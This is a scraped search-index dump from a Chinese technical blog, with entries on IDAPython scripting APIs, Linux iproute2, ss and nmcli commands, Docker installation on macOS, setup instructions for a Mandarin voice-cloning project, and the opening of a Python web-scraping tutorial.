ida_bytes.patch_qword(addr,qword)，设置虚拟地址addr处的一个四字值 ida_bytes.is_loaded(addr)，如果addr包含有效数据，则返回1，否则返回0 ","date":"2021-11-14","objectID":"/zh-cn/14-2/:1:1","tags":["二进制","汇编语言","逆向","IDA","脚本"],"title":"常用IDA脚本开发API","uri":"/zh-cn/14-2/"},{"categories":["二进制","汇编语言","逆向","IDA","脚本"],"content":"2用户交互函数 ida_kernwin.warning(string format, ...)，在对话框中显示一条格式化消息 ida_kernwin.ask_str(defval, hist, prompt)，显示一个输入框，要求用户输入一个字符串值。defval为输入框中的默认值，hist为history id传入数字，用途不明，prompt代表输入字符串的意图。操纵成功后返回用户输入的字符串，若取消操作则返回None ida_kernwin.ask_file(saving, defval, title)，显示一个文件选择对话框，saveing为1时为保存文件，为0时为读取文件；defval为文件名输入框中的默认值，能够起到一定的筛选格式的作用；title为对话框标题。操作成功后返回目标文件的绝对路径，否则返回None ida_kernwin.ask_yn(deflt,msg)，弹出用户确认对话框，deflt为默认选项，1为确认，0为否认，-1为取消；msg为对话框的提示信息。返回值为用户的选项。 idc.get_screen_ea()，返回当前光标所在的虚拟地址 ida_kernwin.jumpto(addr)，跳转到反汇编窗口的addr地址所在处  由于IDA脚本开发没有调试工具（不清楚IDA Pro 7.5有没有，至少老版本没有），所以需要使用print等函数来作为主要的调试工具。 ","date":"2021-11-14","objectID":"/zh-cn/14-2/:1:2","tags":["二进制","汇编语言","逆向","IDA","脚本"],"title":"常用IDA脚本开发API","uri":"/zh-cn/14-2/"},{"categories":["二进制","汇编语言","逆向","IDA","脚本"],"content":"3操纵数据库名称 idc.get_name(ea,flag=0)，返回与给定地址ea处有关的名称，如果没名称则返回空字符串。flag可忽略，作用不明。 idc.set_name(ea,name,flag=0)，将给定的名称分配给指定的地址，如果name == \"\"则删除已有名称。flag可忽略，作用不明。 idc.get_name_ea_simple(name)，返回指定名称所在的地址，不支持正则匹配，如果找不到则返回0xffffffffffffffff ","date":"2021-11-14","objectID":"/zh-cn/14-2/:1:3","tags":["二进制","汇编语言","逆向","IDA","脚本"],"title":"常用IDA脚本开发API","uri":"/zh-cn/14-2/"},{"categories":["二进制","汇编语言","逆向","IDA","脚本"],"content":"4处理函数的函数 idc.get_func_attr(ea,attr)，返回ea处函数的attr属性值。attr有四个选项：FUNCATTR_START=0，FUNCATTR_END=8，FUNCATTR_OWNER=24，FUNCATTR_REFQTY=32。其中ea不一定要求是函数的开头，可以是函数内的某一个地址，这点很好用。 idc.get_func_name(ea)，返回ea处函数的名称。失败则返回空字符串。其中ea不一定要求是函数的开头，可以是函数内的某一个地址，这点很好用。 idc.get_next_func(ea)，从给定地址ea处向下寻找第一个function，并返回其虚拟地址，若找不到则返回-1 idc.get_prev_func(ea)，从给定地址ea处向上寻找第一个function，并返回其虚拟地址，若找不到则返回-1 ","date":"2021-11-14","objectID":"/zh-cn/14-2/:1:4","tags":["二进制","汇编语言","逆向","IDA","脚本"],"title":"常用IDA脚本开发API","uri":"/zh-cn/14-2/"},{"categories":["二进制","汇编语言","逆向","IDA","脚本"],"content":"5代码交叉引用函数 ida_xref.get_first_cref_from(frm)，返回给定地址向其转交控制权的第一个位置。如果没有则返回-1 ida_xref.get_next_cref_from(frm, current)，如果current已经在前一次调用Rfirst或Rnext时返回，则返回给定地址frm转交控制权的下一个位置。如果没有则返回-1 idc.get_xref_type()，返回一个常量，说明某个交叉引用查询函数（如Rfirst）返回的最后一个交叉引用的类型。对于代码交叉引用，这些常量包括fl_CN（近调用）、fl_CF（远调用）、fl_JN（近跳转）、fl_JF（远跳转）和fl_F（普通顺序流） ida_xref.get_first_cref_to(to)，返回转交控制权到给定地址的第一个位置。如果没有则返回-1 ida_xref.get_next_cref_to(to, current)，如果current已经在前一次调用Rfirst或Rnext时返回，则返回下一个转交控制权到给定地址的第一个位置。如果没有则返回-1 ","date":"2021-11-14","objectID":"/zh-cn/14-2/:1:5","tags":["二进制","汇编语言","逆向","IDA","脚本"],"title":"常用IDA脚本开发API","uri":"/zh-cn/14-2/"},{"categories":["二进制","汇编语言","逆向","IDA","脚本"],"content":"6数据交叉引用函数 ida_xref.get_first_dref_from(frm)，返回给定地址引用一个数据值的第一个位置。如果没有则返回-1 ida_xref.get_next_dref_from(frm, current)，如果current已经在前一次调用Dfirst或Dnext时返回，则返回给定地址frm向其引用一个数据值的下一个位置。如果没有则返回-1 idc.get_xref_type()，返回一个常量，说明某个交叉引用查询函数（如Dfirst）返回的最后一个交叉引用的类型。对于数据交叉引用，这些常量包括dr_0（提供的偏移量）、dr_W（数据写入）和dr_R（数据读取） ida_xref.get_first_dref_to(to)，返回将给定地址to作为数据引用的第一个位置。如果没有则返回-1 ida_xref.get_next_dref_to(to, current)，如果current已经在前一次调用Dfirst或Dnext时返回，则返回将给定地址to作为数据引用的下一次位置。如果没有则返回-1 ","date":"2021-11-14","objectID":"/zh-cn/14-2/:1:6","tags":["二进制","汇编语言","逆向","IDA","脚本"],"title":"常用IDA脚本开发API","uri":"/zh-cn/14-2/"},{"categories":["二进制","汇编语言","逆向","IDA","脚本"],"content":"7数据库操纵函数 ida_bytes.del_items(ea,flag=0,nbytes=1,may_destroy=None)，取消给定地址ea处的定义，其他参数可省略，意义不明。相当于按快捷键U idc.create_insn(ea)，将目标地址解释为汇编代码，相当于按快捷键C，成功后返回True，否则返回False ida_bytes.create_data，将目标地址识别为指定类型的数据。用法如下 create_data(ea, FF_BYTE, 1, ida_idaapi.BADADDR) == MakeByte(ea); create_data(ea, FF_WORD, 2, ida_idaapi.BADADDR) == MakeWord(ea); create_data(ea, FF_DWORD, 4, ida_idaapi.BADADDR) == MakeDword(ea); create_data(ea, FF_QWORD, 8, ida_idaapi.BADADDR) == MakeQword(ea); create_data(ea, FF_OWORD, 16, ida_idaapi.BADADDR) == MakeOword(ea); create_data(ea, FF_YWORD, 32, ida_idaapi.BADADDR) == MakeYword(ea); create_data(ea, FF_FLOAT, 4, ida_idaapi.BADADDR) == MakeFloat(ea); create_data(ea, FF_DOUBLE, 8, ida_idaapi.BADADDR) == MakeDouble(ea); create_data(ea, FF_PACKREAL, 10, ida_idaapi.BADADDR) == MakePackReal(ea); create_data(ea, FF_TBYTE, 10, ida_idaapi.BADADDR) == MakeTbyte(ea); create_data(ea, FF_CUSTOM, size, dtid|((fid)\u003c\u003c16)) == MakeCustomData(ea, size, dtid, fid); idc.set_cmt(ea, cmt, isRepeatable)，在指定地址ea处添加注释，isRepeatable表明是否可重复注释 ida_funcs.add_func(ea1, ea2=BADADDR)，在指定地址处创建函数，相当于按快捷键P ","date":"2021-11-14","objectID":"/zh-cn/14-2/:1:7","tags":["二进制","汇编语言","逆向","IDA","脚本"],"title":"常用IDA脚本开发API","uri":"/zh-cn/14-2/"},{"categories":["二进制","汇编语言","逆向","IDA","脚本"],"content":"8数据库搜索函数 ida_search.find_code(ea,flag)，从给定的地址搜索一条指令 ida_search.find_data(ea,flag)，从给定的地址搜索一个数据项 ida_search.find_binary(start_ea, y, x, binary, sflag)，在给定的地址，从给定行的给定列搜索binary ida_search.find_text(start_ea, y, x, ustr, sflag)，在给定的地址，从给定行的给定列搜索字符串 ","date":"2021-11-14","objectID":"/zh-cn/14-2/:1:8","tags":["二进制","汇编语言","逆向","IDA","脚本"],"title":"常用IDA脚本开发API","uri":"/zh-cn/14-2/"},{"categories":["二进制","汇编语言","逆向","IDA","脚本"],"content":"9反汇编行组件 idc.generate_disasm_line(ea,flag)，返回反汇编窗口中目标地址的代码（包括但不限于汇编代码），flag填个0就行。 idc.print_insn_mnem(ea)，返回反汇编窗口中目标地址的指令助记符部分，若非汇编代码则返回空字符串 idc.print_operand(ea,index)，返回反汇编窗口中目标地址的操作数的文本形式，index为操作数编号从0开始。 idc.get_operand_type(ea,index)，返回一个整数，指出给定地址的给定操作数的类型，具体需参考IDC文档了解操作数类型代码 idc.get_operand_value(ea,index)，返回与给定地址的给定操作数有关的整数值。返回值的性质取决于GetOpType指定的给定操作数的类型 ","date":"2021-11-14","objectID":"/zh-cn/14-2/:1:9","tags":["二进制","汇编语言","逆向","IDA","脚本"],"title":"常用IDA脚本开发API","uri":"/zh-cn/14-2/"},{"categories":["二进制","汇编语言","逆向","IDA","脚本"],"content":"参考文献 IDA Pro 权威指南（第二版） https://hex-rays.com/products/ida/support/idapython_docs/ https://hex-rays.com/products/ida/support/ida74_idapython_no_bc695_porting_guide.shtml ","date":"2021-11-14","objectID":"/zh-cn/14-2/:2:0","tags":["二进制","汇编语言","逆向","IDA","脚本"],"title":"常用IDA脚本开发API","uri":"/zh-cn/14-2/"},{"categories":["Linux","网络","命令"],"content":"Linux网络管理命令 2009年 Debian 开发者邮件列表宣布放弃使用缺乏维护的net-tools工具包，net-tools包含历史悠久的ifconfig, netstat等网络相关的命令 iproute2用于取代net-tools，在大部分的发行版都自带了。命令有ip, ss, net等命令替代了之前的网络操作命令。 ","date":"2021-11-14","objectID":"/zh-cn/14-1/:0:0","tags":["Linux","网络","命令"],"title":"Linux网络管理命令","uri":"/zh-cn/14-1/"},{"categories":["Linux","网络","命令"],"content":"命令对照表 net-tools iproute2 arp -na ip neigh ifconfig ip link ifconfig -a ip addr show ifconfig -s ip -s link ifconfig eth0 up ip link set eth0 up ipmaddr ip maddr iptunnel ip tunnel netstat ss netstat -i ip -s link netstat -g ip maddr netstat -l ss -l netstat -r ip route route add ip route add route del ip route del route -n ip route show vconfig ip link ","date":"2021-11-14","objectID":"/zh-cn/14-1/:1:0","tags":["Linux","网络","命令"],"title":"Linux网络管理命令","uri":"/zh-cn/14-1/"},{"categories":["Linux","网络","命令"],"content":"ip命令 ","date":"2021-11-14","objectID":"/zh-cn/14-1/:2:0","tags":["Linux","网络","命令"],"title":"Linux网络管理命令","uri":"/zh-cn/14-1/"},{"categories":["Linux","网络","命令"],"content":"配置ip或者接口 ip a 显示所有网络接口 ip -4 a 显示所有 IPv4 相关网络接口 ip a show eth0 查看特定的网络接口 ip a add 192.168.80.174 dev eth0 添加ip地址 ip a del 192.168.80.174 dev eth0 删除ip地址 ip -s -s a f to 192.168.1.0/24 清除所有接口上的所有地址 ip link set dev eth0 address 00:0c:29:33:4e:aa 添加MAC地址 ip link set eth0 down 禁用网络接口 ip link set eth0 up 启用网络接口 ip link ls up 列出正在运行的网络接口 ip link set dev eth0 arp on 启用ARP协议 ip link set txqueuelen 10000 dev eth0 设置队列传输长度 ip link set mtu 9000 dev eth0 设置最大传输单元 ","date":"2021-11-14","objectID":"/zh-cn/14-1/:2:1","tags":["Linux","网络","命令"],"title":"Linux网络管理命令","uri":"/zh-cn/14-1/"},{"categories":["Linux","网络","命令"],"content":"配置路由 # 查看所有路由表 ip r # 添加/删除默认的网关 ip route add default via 192.168.1.254 # 添加路由 ip route add 192.168.1.0/24 dev eth0 ip route add 192.168.1.0/24 via 192.168.1.1 # 删除路由 ip route del 192.168.1.0/24 dev eth0 ip route del 192.168.1.0/24 via 192.168.1.1 ","date":"2021-11-14","objectID":"/zh-cn/14-1/:2:2","tags":["Linux","网络","命令"],"title":"Linux网络管理命令","uri":"/zh-cn/14-1/"},{"categories":["Linux","网络","命令"],"content":"ss命令 ss是Socket Statistics的缩写，用来获取socket统计信息，可以显示和netstat类似的内容。ss的优势在于它能够显示更多更详细的有关TCP和连接状态的信息，而且比netstat更快速更高效。 ","date":"2021-11-14","objectID":"/zh-cn/14-1/:3:0","tags":["Linux","网络","命令"],"title":"Linux网络管理命令","uri":"/zh-cn/14-1/"},{"categories":["Linux","网络","命令"],"content":"SS命令使用实例 常用命令 作用 ss -t -a 显示TCP连接 ss -s 显示 Sockets 摘要 ss -l 列出所有打开的网络连接端口 ss -pl 查看进程使用的socket ss -u -a 显示所有UDP Sockets ss -anltp 显示所有监听的tcp端口 ","date":"2021-11-14","objectID":"/zh-cn/14-1/:3:1","tags":["Linux","网络","命令"],"title":"Linux网络管理命令","uri":"/zh-cn/14-1/"},{"categories":["Linux","网络","命令"],"content":"用TCP 状态过滤Sockets 显示所有状态为Established的HTTP连接（http可以换成ssh或数字） ss -anltp state established '( dport = :http or sport = :http )' state 可选的有 established syn-sent syn-recv fin-wait-1 fin-wait-2 time-wait closed close-wait last-ack listen closing all : 所有以上状态 connected : 除了listen and closed的所有状态 synchronized : 所有已连接的状态除了syn-sent bucket : 显示状态为maintained as minisockets,如：time-wait和syn-recv big : 和bucket相反 ","date":"2021-11-14","objectID":"/zh-cn/14-1/:3:2","tags":["Linux","网络","命令"],"title":"Linux网络管理命令","uri":"/zh-cn/14-1/"},{"categories":["Linux","网络","命令"],"content":"NetworkManager NetworkManager 是一个守护进程，用户不与 NetworkManager 系统服务直接互动，而是通过图形及命令行用户界面工具执行网络配置任务。Red Hat Enterprise Linux 7 中有以下工具可用： nmtui nmcli 和一些图形界面管理工具等 参考文档: https://access.redhat.com/documentation/zh-cn/red_hat_enterprise_linux/7/html/networking_guide/ch-introduction_to_rhel_networking 查看NetworkManager状态 systemctl status NetworkManager ","date":"2021-11-14","objectID":"/zh-cn/14-1/:4:0","tags":["Linux","网络","命令"],"title":"Linux网络管理命令","uri":"/zh-cn/14-1/"},{"categories":["Linux","网络","命令"],"content":"nmcli 常用命令，connection可以简写成c nmcli c reload 重新加载配置文件 nmcli connection show 要显示所有链接 nmcli device status 显示由 NetworkManager 识别到设备及其状态： nmcli dev disconnect iface bond0 停止网络接口 nmcli con up ens33 激活网络连接 ","date":"2021-11-14","objectID":"/zh-cn/14-1/:4:1","tags":["Linux","网络","命令"],"title":"Linux网络管理命令","uri":"/zh-cn/14-1/"},{"categories":["Linux","网络","命令"],"content":"nmtui 安装 yum install NetworkManager-tui ","date":"2021-11-14","objectID":"/zh-cn/14-1/:4:2","tags":["Linux","网络","命令"],"title":"Linux网络管理命令","uri":"/zh-cn/14-1/"},{"categories":["MacOS","Docker","镜像"],"content":"安装 Docker ","date":"2021-11-13","objectID":"/zh-cn/14/:1:0","tags":["MacOS","Docker","镜像"],"title":"安装 Docker","uri":"/zh-cn/14/"},{"categories":["MacOS","Docker","镜像"],"content":"方式一：使用 Homebrew 安装 Homebrew 的 Cask 已经支持 Docker Desktop for Mac。因此，您可以很方便的使用 Homebrew Cask 来安装 Docker： $ brew install --cask docker ","date":"2021-11-13","objectID":"/zh-cn/14/:1:1","tags":["MacOS","Docker","镜像"],"title":"安装 Docker","uri":"/zh-cn/14/"},{"categories":["MacOS","Docker","镜像"],"content":"方式二：手动下载安装 如果您需要手动下载，请下载 Docker 官网的 Docker.dmg 文件，文件大约 500 MB。 如同 macOS 其它软件一样，安装也非常简单，双击下载的 .dmg 文件，然后将 Moby 的鲸鱼图标拖拽到 Application 文件夹即可。 ","date":"2021-11-13","objectID":"/zh-cn/14/:1:2","tags":["MacOS","Docker","镜像"],"title":"安装 Docker","uri":"/zh-cn/14/"},{"categories":["MacOS","Docker","镜像"],"content":"运行 Docker 中的服务 从您的桌面应用中找到 Docker 图标并点击运行。 运行之后，会在右上角菜单栏看到多了一个 Moby 鲸鱼图标，这个图标表明了 Docker 的运行状态。 每次点击鲸鱼图标会弹出操作菜单。 之后，您可以在终端通过命令检查安装后的 Docker 版本。 $ docker --version Docker version 20.10.0, build 7287ab3 （可选）如果 docker version、docker info 都正常的话，可以尝试运行一个 Nginx 服务器。 运行以下命令运行 Nginx 服务。 $ docker run -d -p 80:80 --name webserver nginx 服务运行后，访问 http://localhost，如果看到了 “Welcome to nginx!”，就说明 Docker Desktop for Mac 安装成功了。 要停止 Nginx 服务器并删除执行下面的命令： $ docker stop webserver $ docker rm webserver ","date":"2021-11-13","objectID":"/zh-cn/14/:2:0","tags":["MacOS","Docker","镜像"],"title":"安装 Docker","uri":"/zh-cn/14/"},{"categories":["MacOS","Docker","镜像"],"content":"镜像加速 如果您在使用过程中发现拉取 Docker 镜像十分缓慢，可以配置 Docker 国内镜像加速。 ","date":"2021-11-13","objectID":"/zh-cn/14/:3:0","tags":["MacOS","Docker","镜像"],"title":"安装 Docker","uri":"/zh-cn/14/"},{"categories":["AI","人工智能","语音"],"content":"实时语音克隆 ","date":"2021-11-13","objectID":"/zh-cn/13-1/:0:0","tags":["AI","人工智能","语音"],"title":"实时语音克隆","uri":"/zh-cn/13-1/"},{"categories":["AI","人工智能","语音"],"content":"English | 中文 ","date":"2021-11-13","objectID":"/zh-cn/13-1/:0:1","tags":["AI","人工智能","语音"],"title":"实时语音克隆","uri":"/zh-cn/13-1/"},{"categories":["AI","人工智能","语音"],"content":"DEMO VIDEO | Wiki教程 ｜ 训练教程 ","date":"2021-11-13","objectID":"/zh-cn/13-1/:0:2","tags":["AI","人工智能","语音"],"title":"实时语音克隆","uri":"/zh-cn/13-1/"},{"categories":["AI","人工智能","语音"],"content":"特性 🌍 中文 支持普通话并使用多种中文数据集进行测试：aidatatang_200zh, magicdata, aishell3, biaobei, MozillaCommonVoice, data_aishell 等 🤩 PyTorch 适用于 pytorch，已在 1.9.0 版本（最新于 2021 年 8 月）中测试，GPU Tesla T4 和 GTX 2060 🌍 Windows + Linux 可在 Windows 操作系统和 linux 操作系统中运行（苹果系统M1版也有社区成功运行案例） 🤩 Easy \u0026 Awesome 仅需下载或新训练合成器（synthesizer）就有良好效果，复用预训练的编码器/声码器，或实时的HiFi-GAN作为vocoder 🌍 Webserver Ready 可伺服你的训练结果，供远程调用 ","date":"2021-11-13","objectID":"/zh-cn/13-1/:1:0","tags":["AI","人工智能","语音"],"title":"实时语音克隆","uri":"/zh-cn/13-1/"},{"categories":["AI","人工智能","语音"],"content":"开始 ","date":"2021-11-13","objectID":"/zh-cn/13-1/:2:0","tags":["AI","人工智能","语音"],"title":"实时语音克隆","uri":"/zh-cn/13-1/"},{"categories":["AI","人工智能","语音"],"content":"1. 安装要求 按照原始存储库测试您是否已准备好所有环境。 Python 3.7 或更高版本 需要运行工具箱。 安装 PyTorch。 如果在用 pip 方式安装的时候出现 ERROR: Could not find a version that satisfies the requirement torch==1.9.0+cu102 (from versions: 0.1.2, 0.1.2.post1, 0.1.2.post2) 这个错误可能是 python 版本过低，3.9 可以安装成功 安装 ffmpeg。 运行pip install -r requirements.txt 来安装剩余的必要包。 安装 webrtcvad pip install webrtcvad-wheels。 ","date":"2021-11-13","objectID":"/zh-cn/13-1/:2:1","tags":["AI","人工智能","语音"],"title":"实时语音克隆","uri":"/zh-cn/13-1/"},{"categories":["AI","人工智能","语音"],"content":"2. 准备预训练模型 考虑训练您自己专属的模型或者下载社区他人训练好的模型: 近期创建了知乎专题 将不定期更新炼丹小技巧or心得，也欢迎提问 2.1 使用数据集自己训练合成器模型（与2.2二选一） 下载 数据集并解压：确保您可以访问 train 文件夹中的所有音频文件（如.wav） 进行音频和梅尔频谱图预处理： python pre.py \u003cdatasets_root\u003e -d {dataset} -n {number} 可传入参数： -d{dataset} 指定数据集，支持 aidatatang_200zh, magicdata, aishell3, data_aishell, 不传默认为aidatatang_200zh -n {number} 指定并行数，CPU 11770k + 32GB实测10没有问题 假如你下载的 aidatatang_200zh文件放在D盘，train文件路径为 D:\\data\\aidatatang_200zh\\corpus\\train , 你的datasets_root就是 D:\\data\\ 训练合成器： python synthesizer_train.py mandarin \u003cdatasets_root\u003e/SV2TTS/synthesizer 当您在训练文件夹 synthesizer/saved_models/ 中看到注意线显示和损失满足您的需要时，请转到启动程序一步。 2.2使用社区预先训练好的合成器（与2.1二选一） 当实在没有设备或者不想慢慢调试，可以使用社区贡献的模型(欢迎持续分享): 作者 下载链接 效果预览 信息 作者 https://pan.baidu.com/s/1iONvRxmkI-t1nHqxKytY3g 百度盘链接 4j5d 75k steps 用3个开源数据集混合训练 作者 https://pan.baidu.com/s/1fMh9IlgKJlL2PIiRTYDUvw 百度盘链接 提取码：om7f 25k steps 用3个开源数据集混合训练, 切换到tag v0.0.1使用 @FawenYo https://drive.google.com/file/d/1H-YGOUHpmqKxJ9FRc6vAjPuqQki24UbC/view?usp=sharing 百度盘链接 提取码：1024 input output 200k steps 台湾口音需切换到tag v0.0.1使用 @miven https://pan.baidu.com/s/1PI-hM3sn5wbeChRryX-RCQ 提取码：2021 https://www.bilibili.com/video/BV1uh411B7AD/ 150k steps 注意：根据issue修复 并切换到tag v0.0.1使用 2.3训练声码器 (可选) 对效果影响不大，已经预置3款，如果希望自己训练可以参考以下命令。 预处理数据: python vocoder_preprocess.py \u003cdatasets_root\u003e -m \u003csynthesizer_model_path\u003e \u003cdatasets_root\u003e替换为你的数据集目录，\u003csynthesizer_model_path\u003e替换为一个你最好的synthesizer模型目录，例如 sythensizer\\saved_mode\\xxx 训练wavernn声码器: python vocoder_train.py \u003ctrainid\u003e \u003cdatasets_root\u003e \u003ctrainid\u003e替换为你想要的标识，同一标识再次训练时会延续原模型 训练hifigan声码器: python vocoder_train.py \u003ctrainid\u003e \u003cdatasets_root\u003e hifigan \u003ctrainid\u003e替换为你想要的标识，同一标识再次训练时会延续原模型 ","date":"2021-11-13","objectID":"/zh-cn/13-1/:2:2","tags":["AI","人工智能","语音"],"title":"实时语音克隆","uri":"/zh-cn/13-1/"},{"categories":["AI","人工智能","语音"],"content":"3. 启动程序或工具箱 您可以尝试使用以下命令： ","date":"2021-11-13","objectID":"/zh-cn/13-1/:2:3","tags":["AI","人工智能","语音"],"title":"实时语音克隆","uri":"/zh-cn/13-1/"},{"categories":["AI","人工智能","语音"],"content":"3.1 启动Web程序： python web.py 运行成功后在浏览器打开地址, 默认为 http://localhost:8080 注：目前界面比较buggy, 第一次点击录制要等待几秒浏览器正常启动录音，否则会有重音 录制结束不要再点录制而是停止 仅支持手动新录音（16khz）, 不支持超过4MB的录音，最佳长度在5~15秒 默认使用第一个找到的模型，有动手能力的可以看代码修改 web\\__init__.py。 ","date":"2021-11-13","objectID":"/zh-cn/13-1/:2:4","tags":["AI","人工智能","语音"],"title":"实时语音克隆","uri":"/zh-cn/13-1/"},{"categories":["AI","人工智能","语音"],"content":"3.2 启动工具箱： python demo_toolbox.py -d \u003cdatasets_root\u003e 请指定一个可用的数据集文件路径，如果有支持的数据集则会自动加载供调试，也同时会作为手动录制音频的存储目录。 ","date":"2021-11-13","objectID":"/zh-cn/13-1/:2:5","tags":["AI","人工智能","语音"],"title":"实时语音克隆","uri":"/zh-cn/13-1/"},{"categories":["AI","人工智能","语音"],"content":"文件结构（目标读者：开发者） ├─archived_untest_files 废弃文件 ├─encoder encoder模型 │ ├─data_objects │ └─saved_models 预训练好的模型 ├─samples 样例语音 ├─synthesizer synthesizer模型 │ ├─models │ ├─saved_models 预训练好的模型 │ └─utils 工具类库 ├─toolbox 图形化工具箱 ├─utils 工具类库 ├─vocoder vocoder模型（目前包含hifi-gan、wavrnn） │ ├─hifigan │ ├─saved_models 预训练好的模型 │ └─wavernn └─web ├─api │ └─Web端接口 ├─config │ └─ Web端配置文件 ├─static 前端静态脚本 │ └─js ├─templates 前端模板 └─__init__.py Web端入口文件 ","date":"2021-11-13","objectID":"/zh-cn/13-1/:3:0","tags":["AI","人工智能","语音"],"title":"实时语音克隆","uri":"/zh-cn/13-1/"},{"categories":["AI","人工智能","语音"],"content":"引用及论文 该库一开始从仅支持英语的Real-Time-Voice-Cloning 分叉出来的，鸣谢作者。 URL Designation 标题 实现源码 1803.09017 GlobalStyleToken (synthesizer) Style Tokens: Unsupervised Style Modeling, Control and Transfer in End-to-End Speech Synthesis 本代码库 2010.05646 HiFi-GAN (vocoder) Generative Adversarial Networks for Efficient and High Fidelity Speech Synthesis 本代码库 1806.04558 SV2TTS Transfer Learning from Speaker Verification to Multispeaker Text-To-Speech Synthesis 本代码库 1802.08435 WaveRNN (vocoder) Efficient Neural Audio Synthesis fatchord/WaveRNN 1703.10135 Tacotron (synthesizer) Tacotron: Towards End-to-End Speech Synthesis fatchord/WaveRNN 1710.10467 GE2E (encoder) Generalized End-To-End Loss for Speaker Verification 本代码库 ","date":"2021-11-13","objectID":"/zh-cn/13-1/:4:0","tags":["AI","人工智能","语音"],"title":"实时语音克隆","uri":"/zh-cn/13-1/"},{"categories":["AI","人工智能","语音"],"content":"常見問題(FQ\u0026A) 1.數據集哪裡下載? 数据集 OpenSLR地址 其他源 (Google Drive, Baidu网盘等) aidatatang_200zh OpenSLR Google Drive magicdata OpenSLR Google Drive (Dev set) aishell3 OpenSLR Google Drive data_aishell OpenSLR 解壓 aidatatang_200zh 後，還需將 aidatatang_200zh\\corpus\\train下的檔案全選解壓縮 2.\u003cdatasets_root\u003e是什麼意思? 假如數據集路徑為 D:\\data\\aidatatang_200zh，那麼 \u003cdatasets_root\u003e就是 D:\\data 3.訓練模型顯存不足 訓練合成器時：將 synthesizer/hparams.py中的batch_size參數調小 //調整前 tts_schedule = [(2, 1e-3, 20_000, 12), # Progressive training schedule (2, 5e-4, 40_000, 12), # (r, lr, step, batch_size) (2, 2e-4, 80_000, 12), # (2, 1e-4, 160_000, 12), # r = reduction factor (# of mel frames (2, 3e-5, 320_000, 12), # synthesized for each decoder iteration) (2, 1e-5, 640_000, 12)], # lr = learning rate //調整後 tts_schedule = [(2, 1e-3, 20_000, 8), # Progressive training schedule (2, 5e-4, 40_000, 8), # (r, lr, step, batch_size) (2, 2e-4, 80_000, 8), # (2, 1e-4, 160_000, 8), # r = reduction factor (# of mel frames (2, 3e-5, 320_000, 8), # synthesized for each decoder iteration) (2, 1e-5, 640_000, 8)], # lr = learning rate 聲碼器-預處理數據集時：將 synthesizer/hparams.py中的batch_size參數調小 //調整前 ### Data Preprocessing max_mel_frames = 900, rescale = True, rescaling_max = 0.9, synthesis_batch_size = 16, # For vocoder preprocessing and inference. //調整後 ### Data Preprocessing max_mel_frames = 900, rescale = True, rescaling_max = 0.9, synthesis_batch_size = 8, # For vocoder preprocessing and inference. 聲碼器-訓練聲碼器時：將 vocoder/wavernn/hparams.py中的batch_size參數調小 //調整前 # Training voc_batch_size = 100 voc_lr = 1e-4 voc_gen_at_checkpoint = 5 voc_pad = 2 //調整後 # Training voc_batch_size = 6 voc_lr = 1e-4 voc_gen_at_checkpoint = 5 voc_pad =2 4.碰到RuntimeError: Error(s) in loading state_dict for Tacotron: size mismatch for encoder.embedding.weight: copying a param with shape torch.Size([70, 512]) from checkpoint, the shape in current model is torch.Size([75, 512]). 請參照 issue #37 5.如何改善CPU、GPU佔用率? 適情況調整batch_size參數來改善 6.發生 頁面文件太小，無法完成操作 請參考這篇文章，將虛擬內存更改為100G(102400)，例如:档案放置D槽就更改D槽的虚拟内存 7.什么时候算训练完成？ 首先一定要出现注意力模型，其次是loss足够低，取决于硬件设备和数据集。拿本人的供参考，我的注意力是在 18k 步之后出现的，并且在 50k 步之后损失变得低于 0.4 快速开始 (新手友好版) 本快速开始教程是以Windows为例的，假设不做任何训练（节省几小时甚至几天时间），假设你对python等开发环境也不熟悉，也可能没有支持CUDA的GPU 安装 如果已经确认安装过，请忽略该步骤 拉取本代码库 安装Anacodna， Python 3.8 或更高，参考中文教程，在Anaconda中创建并切换到独立虚拟环境后，进行以下步骤。 安装 PyTorch， 直接官网下载。如果GPU不支持CUDA，请默认选择。 验证本步骤是否成功：在系统任意路径下运行python，进入交互式编程界面后输入 import torch;, 回车， torch.cuda.is_available(), 回车。如果都是成功的话，可以进行下一步。 安装 ffmpeg。 1）下载 选择点击打开链接Windows对应的版本下载 2）解压 ffmpeg-xxxx.zip 文件到指定目录； 3）将解压后的文件目录中 bin 目录（包含 ffmpeg.exe ）添加进 path 环境变量中； 4）进入 cmd，输入 ffmpeg -version，可验证当前系统是否识别 ffmpeg 以及查看 ffmpeg 的版本 运行pip install -r requirements.txt 来安装剩余的必要包。 确保本步骤不报错 安装 webrtcvad 用 pip install webrtcvad-wheels。 确保本步骤不报错 下载社区训练好的模型 在以下选择中下载模型 作者 下载链接 效果预览 @miven https://pan.baidu.com/s/1PI-hM3sn5wbeChRryX-RCQ 提取码：2021 https://www.bilibili.com/video/BV1uh411B7AD/ 该模型与最新代码有兼容性问题 请查阅 https://github.com/babysor/MockingBird/issues/37 解决 下载完成后，确保 xxx.pt 格式的文件放在代码库的 synthesizer\\saved_models文件夹下，saved_models如不存在请新建 运行demo_toolbox 在代码库路径下，运行 python demo_toolbox.py -d .\\samples 尝试使用工具箱, 由于没有下载任何数据集，这里的功能比较简单： 确保界面左边中间的 synthesizer 选择了上一步中 xxx.pt 文件对应的模型。 点击Record录入你的5秒语音 输入任意文字 点击 Synthesizer and vocode 等待效果输出 使用技巧参考：https://zhuanlan.zhihu.com/p/425692267 ","date":"2021-11-13","objectID":"/zh-cn/13-1/:5:0","tags":["AI","人工智能","语音"],"title":"实时语音克隆","uri":"/zh-cn/13-1/"},{"categories":["编程","代码","Python"],"content":"使用Python打造自己的信息收集工具 介绍： 该篇章主要介绍如何编写自己的信息收集工具，主要流程如下： 1、向bing搜索引擎发起request请求，获取url数据 2、使用正则表达式对获取的数据进行处理 3、用多线程，对处理的数据进行二次请求，返回标题等数据 4、使用openyxl模块，将数据保存为.xlsx格式 请注意： 该篇章目的是熟悉Python编程，学习Python的一些常见模块，在编写程序的过程中会有很多操作和方式方法，望大家能共同加油学到东西。本文仅用于技术讨论与研究，这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，本站及作者概不负责。 本文涉及到模块有： #coding:utf-8 import requests #发起request请求 import urllib3 #处理请求https异常报错问题 import re #使用正则表达式对请求到的数据进行处理 from optparse import OptionParser #自定义输入参数 import threading #多线程模块 import queue #多线程辅助模块，使用队列的方式对多线程进行控制 from bs4 import BeautifulSoup #与re类似 使用正则表达式对请求到的数据进行处理 import time,datetime #获取当前的时间 from openpyxl import * #数据处理，将获取到的数据保存在excel文件中 属性： heads = { #全局变量 请求头 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 